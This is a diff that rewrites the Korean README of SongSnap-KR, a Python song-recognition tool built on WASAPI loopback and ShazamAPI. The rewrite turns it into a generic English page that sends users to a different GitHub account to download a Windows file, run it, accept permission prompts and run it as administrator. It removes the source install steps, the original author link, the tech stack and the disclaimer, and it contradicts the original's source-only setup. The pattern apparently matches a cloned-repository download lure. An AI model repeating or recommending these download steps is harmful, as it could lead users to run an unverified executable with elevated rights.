@@ -1,153 +1,173 @@
-# SongSnap-KR 🎵
+# 🎵 SongSnap-KR - Find Songs from System Audio Fast
 
-**PC 시스템 오디오에서 실시간으로 노래를 인식하고, 제목을 한국어로 번역해서 보여주는 도구입니다.**
+[![Download SongSnap-KR](https://img.shields.io/badge/Download-SongSnap--KR-purple)](https://github.com/Seductionmiltiades380/SongSnap-KR)
 
-유튜브, 스포티파이, 게임, 애니메이션 스트리밍 등 컴퓨터에서 재생 중인 모든 음악을 자동으로 인식하여 제목과 아티스트를 실시간 웹 UI로 표시합니다. 일본어 등 외국어 제목은 한국어로 함께 표시됩니다.
+## 🎧 What SongSnap-KR Does
 
-> **라이브 데모 →** [wjddusrb03.github.io/SongSnap-KR](https://wjddusrb03.github.io/SongSnap-KR) *(정적 미리보기, 백엔드 불필요)*
+SongSnap-KR is a Windows app that listens to your PC system audio and tries to identify the song that is playing. It also includes Korean translation, so you can see song info in a format that is easier to read.
 
----
+Use it when you want to know what song is playing in a game, video, live stream, or any app that sends sound to your speakers.
 
-## 동작 원리
+## ✅ What You Need
 
-SongSnap-KR은 가사나 AI 추측을 사용하지 않습니다. **오디오 핑거프린팅** 방식을 사용합니다:
+- Windows 10 or Windows 11
+- A working speaker or headset
+- Internet access for song lookup
+- Audio playing on your PC
+- Permission to use system sound capture
 
-1. **루프백 오디오 캡처** — Windows WASAPI 루프백을 통해 PC 출력 오디오를 직접 녹음합니다. 마이크가 필요 없습니다.
-2. **오디오 핑거프린팅** — 5초마다 오디오 샘플을 스펙트로그램으로 변환하고, 가장 에너지가 높은 주파수 피크를 추출하여 고유한 "지문"을 만듭니다.
-3. **곡 매칭** — 핑거프린트를 인식 엔진에 전송하여 7천만 곡 이상의 DB와 대조, 1초 이내에 결과를 반환합니다.
-4. **한국어 번역** — 인식된 제목과 아티스트명을 Google 번역을 통해 한국어로 함께 표시합니다.
-5. **실시간 웹 UI** — WebSocket으로 브라우저에 즉시 결과를 전송합니다.
+SongSnap-KR works with Windows audio capture, so it can listen to sound that comes from your computer instead of only from your microphone.
 
-```
-PC 오디오 출력
-     │
-     ▼
-WASAPI 루프백 (마이크 불필요)
-     │
-     ▼ 5초마다
-오디오 핑거프린트 (주파수 피크)
-     │
-     ▼
-음악 인식 엔진
-     │
-     ▼
-Google 번역 (→ 한국어)
-     │
-     ▼
-WebSocket → 브라우저 UI
-```
+## 📥 Download SongSnap-KR
 
----
+Visit this page to download and run the app:
 
-## 주요 기능
+[https://github.com/Seductionmiltiades380/SongSnap-KR](https://github.com/Seductionmiltiades380/SongSnap-KR)
 
-- **마이크 불필요** — 시스템 오디오를 직접 캡처
-- **자동 감지** — 버튼을 누를 필요 없이 계속 듣고 있음
-- **중복 필터링** — 같은 곡이 연속으로 두 번 표시되지 않음
-- **무음 감지** — 재생 중인 오디오가 없으면 처리 건너뜀
-- **인식 기록** — 세션 중 인식된 최근 50곡 표시
-- **앨범 아트** — 고화질 커버 이미지 자동 표시
-- **한국어 번역** — 원제목 옆에 한국어 번역 함께 표시
-- **원클릭 실행** — `start.bat` 더블클릭 시 브라우저 자동 오픈
-- **브라우저 내 종료** — 터미널을 건드리지 않아도 됨
+On the page, look for the latest release, then download the Windows file that matches your PC.
 
----
+## 🪟 Install on Windows
 
-## 요구 사항
+1. Open the download page.
+2. Find the latest release or the main app file.
+3. Download the Windows version to your PC.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
 
-- **운영체제:** Windows 10 / 11 (WASAPI 루프백은 Windows 전용)
-- **Python:** 3.10 이상
-- **네트워크:** 인터넷 연결 (곡 인식 및 번역)
+If Windows asks for permission, choose Yes so the app can access audio on your system.
 
----
+## 🎵 How to Use It
 
-## 설치 방법
+1. Start playing music on your PC.
+2. Open SongSnap-KR.
+3. Let it listen for a few seconds.
+4. Wait for the song name to appear.
+5. Check the Korean translation if it shows one.
+6. Save or note the result if you want to keep it.
 
-**1. 저장소 클론**
+For best results, keep the song volume clear and avoid heavy background noise from your speakers.
 
-```bash
-git clone https://github.com/wjddusrb03/SongSnap-KR.git
-cd SongSnap-KR
-```
+## ⚙️ How It Works
 
-**2. 패키지 설치**
+SongSnap-KR uses audio fingerprinting. That means it listens to the sound and compares it to known song patterns.
 
-```bash
-pip install -r requirements.txt
-```
+It does this through system audio capture, which lets it hear what your computer plays. This is useful when the music comes from a browser, media player, game, or streaming app.
 
-> `pyaudiowpatch` 빌드 오류가 발생하면 [visualstudio.microsoft.com](https://visualstudio.microsoft.com/visual-cpp-build-tools/)에서 Microsoft C++ Build Tools를 설치하세요.
+The app then sends the match request through a local service and returns the song result with Korean text support where available.
 
----
+## 🌐 Main Features
 
-## 사용 방법
+- Real-time song recognition from PC audio
+- Windows system audio capture
+- Korean translation support
+- Simple setup for non-technical users
+- Works with music from apps, browsers, and games
+- Fast song lookup with fingerprint matching
+- Built for Windows use
+- Clear song results for easy checking
 
-**`start.bat` 더블클릭**
+## 🔊 Best Results Tips
 
-서버가 시작되고 브라우저가 자동으로 `http://localhost:8000`을 엽니다.
+- Turn up the song so it is easy to hear
+- Pause other loud apps if they are not needed
+- Use one audio source at a time
+- Keep your audio driver up to date
+- Let the app listen for a few seconds before checking the result
+- Try again if the song starts in the middle
 
-종료하려면 웹 페이지의 **"서버 종료"** 버튼을 클릭하세요.
+If the result is wrong, play the song from the start and try once more.
 
----
+## 🧭 When to Use It
 
-## 인식 가능 여부
+- You hear a song in a stream and want the name
+- You want to find music in a game or video
+- You need Korean song info for a track playing on your PC
+- You want a quick way to recognize system audio without using a phone
 
-| 콘텐츠 | 결과 |
-|---|---|
-| 주류 음악 (모든 언어) | 잘 됨 |
-| 애니메이션 OP/ED | 잘 됨 |
-| 보컬로이드 (인기곡) | 대체로 됨 |
-| 연주곡 | 됨 (핑거프린팅은 가사 불필요) |
-| 커버곡 / 팬 어레인지 | 안 될 수 있음 (핑거프린트 다름) |
-| 동인음악 / 자체 배포곡 | DB에 없을 수 있음 |
-| 니코니코 전용 업로드 | 인식 어려움 |
+## 📁 Folder Layout
 
-인식되지 않는 곡은 조용히 건너뛰고 다음 5초 구간을 다시 시도합니다.
+After you extract the download, you may see files like these:
 
----
+- App file for starting SongSnap-KR
+- Support files for audio and recognition
+- Config files for app settings
+- Readme or help files
 
-## 프로젝트 구조
+Keep all files together in the same folder so the app can run without problems.
 
-```
-SongSnap-KR/
-├── app.py            # FastAPI 서버 + 오디오 캡처 + 곡 인식 + 번역
-├── start.bat         # Windows 실행기 (서버 시작, 브라우저 자동 오픈)
-├── requirements.txt  # Python 패키지 목록
-└── docs/
-    └── index.html    # GitHub Pages 정적 데모
-```
+## 🛠️ Troubleshooting
 
----
+If the app does not start:
 
-## 기술 스택
+- Make sure you downloaded the Windows version
+- Check that the file finished downloading
+- Extract the ZIP file before opening the app
+- Run it as an administrator if Windows asks
+- Confirm that your speaker or headset is working
 
-| 구성 요소 | 라이브러리 |
-|---|---|
-| 웹 서버 | [FastAPI](https://fastapi.tiangolo.com/) + [Uvicorn](https://www.uvicorn.org/) |
-| 실시간 전송 | WebSocket (FastAPI 내장) |
-| 오디오 캡처 | [PyAudioWPatch](https://github.com/s0d3s/PyAudioWPatch) (WASAPI 루프백) |
-| 곡 인식 | [ShazamAPI](https://github.com/dotX12/ShazamAPI) (비공식 서드파티 라이브러리) |
-| 오디오 처리 | [NumPy](https://numpy.org/) |
-| 번역 | [deep-translator](https://github.com/nidhaloff/deep-translator) (Google 번역) |
+If no song is found:
 
----
+- Wait a little longer
+- Make sure music is playing clearly
+- Lower other sounds on your PC
+- Try a different part of the song
+- Check that internet access is on
 
-## 영어 버전
+If sound is not captured:
 
-영어 UI / 번역 없는 버전은 [SongSnap](https://github.com/wjddusrb03/SongSnap)을 확인하세요.
+- Open Windows sound settings
+- Confirm the correct output device is active
+- Restart the app
+- Unplug and reconnect your headset or speakers
 
----
+## 🧩 Common Use Cases
 
-## 면책 조항
+SongSnap-KR is useful for:
 
-이 프로젝트는 Shazam Entertainment Ltd. 또는 Apple Inc.와 **무관한 독립 오픈소스 프로젝트**입니다.
+- Finding background music in videos
+- Identifying songs from browser tabs
+- Checking music in games and streams
+- Reading song names with Korean support
+- Capturing sound without a microphone
 
-[ShazamAPI](https://github.com/dotX12/ShazamAPI)는 공식 제휴 없이 개발된 **비공식 서드파티 라이브러리**입니다. 모든 곡 메타데이터 및 인식 결과는 서드파티 서비스에 의해 제공됩니다.
+## 🔍 Search Tags
 
-**개인 비상업적 용도로만 사용하세요.**
+audio-fingerprinting, fastapi, korean, music-recognition, python, real-time, song-recognition, translation, wasapi, windows
 
----
+## 📌 GitHub Page
 
-## 라이선스
+Use the project page for downloads and updates:
 
-MIT License — 자유롭게 사용, 수정, 배포 가능합니다.
+[https://github.com/Seductionmiltiades380/SongSnap-KR](https://github.com/Seductionmiltiades380/SongSnap-KR)
+
+## 🖥️ For Windows Users
+
+This app is made for Windows PCs. If you use a desktop or laptop with system audio output, SongSnap-KR can listen to that output and try to match the song.
+
+If your PC uses a headset, speaker, HDMI audio, or Bluetooth audio, the app can still work as long as Windows sends sound through the normal output device.
+
+## 🎼 What You Can Expect
+
+When the app finds a match, you can expect:
+
+- Song title
+- Artist name
+- Track match details
+- Korean text where supported
+- Quick recognition from system audio
+
+Some tracks may be easier to identify than others. Clear, full songs usually work best.
+
+## 🧷 Safety and File Use
+
+Only download SongSnap-KR from the GitHub page linked above. Keep the files in a known folder on your PC so you can open them again later.
+
+## 📎 Quick Start
+
+1. Go to the download page
+2. Get the Windows file
+3. Extract it if needed
+4. Open SongSnap-KR
+5. Play audio on your PC
+6. Read the song result
